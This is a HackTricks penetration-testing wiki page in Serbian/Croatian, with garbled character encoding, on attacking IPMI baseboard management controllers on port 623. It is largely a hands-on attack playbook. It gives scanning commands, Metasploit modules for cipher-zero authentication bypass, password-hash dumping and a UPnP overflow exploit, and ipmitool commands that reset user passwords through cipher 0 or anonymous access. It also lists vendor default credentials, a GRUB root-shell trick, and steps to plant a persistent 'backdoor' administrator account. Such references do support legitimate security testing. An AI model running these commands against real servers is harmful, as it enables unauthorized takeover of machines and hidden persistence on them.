# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

### **Overview of IPMI**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** nudi standardizovani pristup za daljinsko upravljanje i nadgledanje raÄunarskih sistema, nezavisno od operativnog sistema ili stanja napajanja. Ova tehnologija omoguÄ‡ava sistem administratorima da upravljaju sistemima na daljinu, Äak i kada su iskljuÄeni ili neodgovaraju, i posebno je korisna za:

- Konfiguracije pre pokretanja operativnog sistema
- Upravljanje iskljuÄenjem
- Oporavak od sistemskih greÅ¡aka

IPMI je sposoban da nadgleda temperature, napone, brzine ventilatora i napajanja, uz pruÅ¾anje informacija o inventaru, pregledanje hardverskih logova i slanje upozorenja putem SNMP-a. Osnovni zahtevi za njegov rad su izvor napajanja i LAN konekcija.

Od svog uvoÄ‘enja od strane Intela 1998. godine, IPMI je podrÅ¾an od strane brojnih dobavljaÄa, poboljÅ¡avajuÄ‡i moguÄ‡nosti daljinskog upravljanja, posebno sa podrÅ¡kom verzije 2.0 za serijsku komunikaciju preko LAN-a. KljuÄne komponente ukljuÄuju:

- **Baseboard Management Controller (BMC):** Glavni mikro-kontroler za IPMI operacije.
- **Communication Buses and Interfaces:** Za internu i eksternu komunikaciju, ukljuÄujuÄ‡i ICMB, IPMB i razne interfejse za lokalne i mreÅ¾ne konekcije.
- **IPMI Memory:** Za Äuvanje logova i podataka.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Default Port**: 623/UDP/TCP (ObiÄno je na UDP-u, ali moÅ¾e biti i na TCP-u)

## Enumeration

### Discovery
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
MoÅ¾ete **identifikovati** **verziju** koristeÄ‡i:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI Ranljivosti

U oblasti IPMI 2.0, znaÄajna sigurnosna slabost otkrivena je od strane Dana Farmera, otkrivajuÄ‡i ranjivost kroz **cipher type 0**. Ova ranjivost, dokumentovana u detalje na [istraÅ¾ivanju Dana Farmera](http://fish2.com/ipmi/cipherzero.html), omoguÄ‡ava neovlaÅ¡Ä‡en pristup sa bilo kojom lozinkom pod uslovom da je ciljana validna korisniÄka. Ova slabost je pronaÄ‘ena kod razliÄitih BMC-ova proizvoÄ‘aÄa kao Å¡to su HP, Dell i Supermicro, Å¡to sugeriÅ¡e Å¡iroko rasprostranjen problem unutar svih IPMI 2.0 implementacija.

### **IPMI ZaobilaÅ¾enje Autentifikacije putem Cipher 0**

Da bi se otkrila ova slabost, moÅ¾e se koristiti sledeÄ‡i Metasploit pomoÄ‡ni skener:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Eksploatacija ove greÅ¡ke je moguÄ‡a sa `ipmitool`, kao Å¡to je prikazano u nastavku, omoguÄ‡avajuÄ‡i listanje i modifikaciju korisniÄkih lozinki:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP Autentifikacija Udaljeno Preuzimanje Hash-a Lozinke**

Ova ranjivost omoguÄ‡ava preuzimanje zasoljenih hash-ova lozinki (MD5 i SHA1) za bilo koje postojeÄ‡e korisniÄko ime. Da biste testirali ovu ranjivost, Metasploit nudi modul:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI Anonymous Authentication**

Podrazumevana konfiguracija u mnogim BMC-ima omoguÄ‡ava "anonimni" pristup, koji se karakteriÅ¡e nul korisniÄkim imenom i lozinkom. Ova konfiguracija se moÅ¾e iskoristiti za resetovanje lozinki imenovanih korisniÄkih naloga koristeÄ‡i `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI Lozinke u ÄŒistom Tekstu**

KritiÄna dizajnerska odluka u IPMI 2.0 zahteva skladiÅ¡tenje lozinki u Äistom tekstu unutar BMC-a u svrhe autentifikacije. SkladiÅ¡tenje ovih lozinki na mestima kao Å¡to su `/nv/PSBlock` ili `/nv/PSStore` postavlja znaÄajne bezbednosne brige:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Ranljivost**

UkljuÄivanje UPnP SSDP sluÅ¡atelja u Supermicro-ovom IPMI firmveru, posebno na UDP portu 1900, uvodi ozbiljan bezbednosni rizik. Ranljivosti u Intel SDK za UPnP ureÄ‘aje verzije 1.3.1, kako je detaljno opisano u [Rapid7-ovom otkriÄ‡u](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), omoguÄ‡avaju pristup root-u BMC-u:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP nasumiÄno generiÅ¡e podrazumevanu lozinku** za svoj **Integrated Lights Out (iLO)** proizvod tokom proizvodnje. Ova praksa se razlikuje od drugih proizvoÄ‘aÄa, koji obiÄno koriste **statiÄne podrazumevane akreditive**. SaÅ¾etak podrazumevanih korisniÄkih imena i lozinki za razliÄite proizvode je dat u nastavku:

- **HP Integrated Lights Out (iLO)** koristi **fabricki nasumiÄno generisanu 8-znamenkastu string** kao svoju podrazumevanu lozinku, pokazujuÄ‡i viÅ¡i nivo sigurnosti.
- Proizvodi poput **Dell-ovog iDRAC, IBM-ovog IMM** i **Fujitsu-ovog Integrated Remote Management Controller** koriste lako pogaÄ‘ajuÄ‡e lozinke kao Å¡to su "calvin", "PASSW0RD" (sa nulom) i "admin" redom.
- SliÄno tome, **Supermicro IPMI (2.0), Oracle/Sun ILOM** i **ASUS iKVM BMC** takoÄ‘e koriste jednostavne podrazumevane akreditive, pri Äemu "ADMIN", "changeme" i "admin" sluÅ¾e kao njihove lozinke.


## Accessing the Host via BMC

Administrativni pristup Kontroleru upravljanja matiÄnom ploÄom (BMC) otvara razliÄite puteve za pristup operativnom sistemu hosta. Jednostavan pristup ukljuÄuje iskoriÅ¡Ä‡avanje KVM funkcionalnosti BMC-a. To se moÅ¾e uraditi ili ponovnim pokretanjem hosta u root shell putem GRUB-a (koristeÄ‡i `init=/bin/sh`) ili pokretanjem sa virtuelnog CD-ROM-a postavljenog kao disk za oporavak. Ove metode omoguÄ‡avaju direktnu manipulaciju diskom hosta, ukljuÄujuÄ‡i umetanje backdoor-a, ekstrakciju podataka ili bilo koje potrebne radnje za procenu sigurnosti. MeÄ‘utim, ovo zahteva ponovno pokretanje hosta, Å¡to je znaÄajan nedostatak. Bez ponovnog pokretanja, pristup aktivnom hostu je sloÅ¾eniji i varira u zavisnosti od konfiguracije hosta. Ako fiziÄka ili serijska konzola hosta ostane prijavljena, moÅ¾e se lako preuzeti putem KVM ili serial-over-LAN (sol) funkcionalnosti BMC-a koristeÄ‡i `ipmitool`. IstraÅ¾ivanje iskoriÅ¡Ä‡avanja zajedniÄkih hardverskih resursa, poput i2c magistrale i Super I/O Äipa, je oblast koja zahteva dalju istragu.

## Introducing Backdoors into BMC from the Host

Nakon kompromitovanja hosta opremljenog BMC-om, **lokalni BMC interfejs se moÅ¾e iskoristiti za umetanje backdoor korisniÄkog naloga**, stvarajuÄ‡i trajnu prisutnost na serveru. Ovaj napad zahteva prisustvo **`ipmitool`** na kompromitovanom hostu i aktivaciju podrÅ¡ke za BMC drajvere. SledeÄ‡e komande ilustruju kako se novi korisniÄki nalog moÅ¾e ubrizgati u BMC koristeÄ‡i lokalni interfejs hosta, Å¡to zaobilazi potrebu za autentifikacijom. Ova tehnika je primenljiva na Å¡irok spektar operativnih sistema ukljuÄujuÄ‡i Linux, Windows, BSD, pa Äak i DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
